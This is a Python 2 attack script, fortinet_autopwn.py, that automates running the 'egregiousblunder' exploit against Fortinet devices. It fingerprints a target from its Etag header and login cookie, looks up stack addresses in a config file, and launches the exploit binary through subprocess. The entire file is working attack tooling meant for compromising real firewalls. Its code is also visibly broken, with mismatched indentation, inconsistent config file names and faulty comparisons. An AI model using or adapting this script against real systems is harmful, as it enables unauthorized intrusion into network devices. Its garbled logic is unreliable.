#!/usr/bin/env python
import requests
import sys
import os
import subprocess
from urlparse import urlparse
import shlex
__author__ = "Kerwin"
__date__ = "2016-9-25"
if __name__ == '__main__':
    if len(sys.argv) != 2:
        print "[*] Usage: fortinet_autopwn.py [URL of target]"
        print "[*] Example: fortinet_autopwn.py http://72.143.26.54/"
        os._exit(0)
    EXP_FILE = True
    if 'egregiousblunder_3.0.0.1' not in os.listdir('.') or 'EGBL.config' not in os.listdir('.'):
        print "[-] Cannot found egregiousblunder_3.0.0.1 or EGBL.config"
        print "[*] Make sure egregiousblunder_3.0.0.1 is in the same folder with this script!"
        EXP_FILE = False
    url = sys.argv[1]
    r = requests.session()
    try:
        etaginfo = r.head(url).headers.get('Etag').strip('"')
    except Exception, e:
        print e
        print "[-] Connection Failed!"
        os._exit(0)
    if not etaginfo:
        print "[-] Couldn't fetch the target Etag info"
        os._exit(0)
    else:
        print "[+]", url, "Etag:", etaginfo
    target = urlparse(url)
    if target.scheme == "https":
        ssloption = '1'
    else:
        ssloption = '0'
    ip = target.hostname
    if target.port:
        port = target.port
    else:
        port = '80'
    etag = etaginfo.split('_')[-1]
        with open('EGBL.conf', 'r') as conf:
        for line in conf:
            if line.startswith('#'):
                pass
            elif etag in line:
                stackadress, firm_version = line.split(
                    ' : ')[1], line.split(' : ')[3]
                WAM = False
                break
            else:
                pass
        else:
            print "File not found"
            stackadress, firm_version = "0x00000", "3"
            WAM = True
    if ord(etag[1]) >= '100':
        req2 = r.head(url.strip('/')+'/login')
        if req2.cookies.get('APSCOOKIE') == '0&0':
            print "[+]", url, "no cookie needed,use v3 or v4 config"
            pwn_cmd = "./egregiousblunder_3.0.0.1 -t %s -p %d -l 5432 --ssl %s -v --config ./EGBL.config --stack %s --nopen --gen %s" % (
                ip, port, ssloption, stackadress, firm_version)
            wam_cmd = "./egregiousblunder_3.0.0.1 -t %s -p %d -l 5432 --ssl %s -v --config ./EGBL.config --wam 10" % (
                ip, port, ssloption)
            if not EXP_FILE:
                print pwn_cmd
                os._exit(0)
            if not WAM:
                subprocess.Popen(shlex.split(pwn_cmd), shell=True)
            else:
                subprocess.Popen(shlex.split(wam_cmd), shell=True)
                stackadress = raw_input("[*]Please input stack address outputed just now:")
                pwn_cmd = "./egregiousblunder_3.0.0.1 -t %s -p %d -l 5432 --ssl %s -v --config ./EGBL.config --stack %s --nopen --gen %s" % (
                ip, port, ssloption, stackadress, firm_version)
                subprocess.Popen(shlex.split(pwn_cmd), shell=True)
        else:
            for i in req2.cookies.keys():
                if i.startswith('APSCOOKIE') and req2.cookies.get(i) == '0&0':
                print "[+]", url, "use the option \"--cookienum", i[9:], "\"and use \"-v 4nc\""
                cookienum = i[9:]
            	else:
            		print "[-] Specific Cookie Not Found,this target may be not Vulnerbale."
            		os._exit(0)
                pwn_cmd = "./egregiousblunder_3.0.0.1 -t %s -p %d -l 5432 --ssl %s -v --config ./EGBL.config --stack %s --nopen --gen 4nc --cookienum %s" % (
                    ip, port, ssloption, stackadress, cookienum)
                wam_cmd = "./egregiousblunder_3.0.0.1 -t %s -p %d -l 5432 --ssl %s -v --config ./EGBL.config --wam 10" % (
                    ip, port, ssloption)
                if not WAM:
               		subprocess.Popen(shlex.split(pwn_cmd), shell=True)
           		else:
	                subprocess.Popen(shlex.split(wam_cmd), shell=True)
	                stackadress = raw_input("[*]Please input stack address outputed just now:")
	                pwn_cmd = "./egregiousblunder_3.0.0.1 -t %s -p %d -l 5432 --ssl %s -v --config ./EGBL.config --stack %s --nopen --gen %s" % (
	                ip, port, ssloption, stackadress, firm_version)
	                subprocess.Popen(shlex.split(pwn_cmd), shell=True)
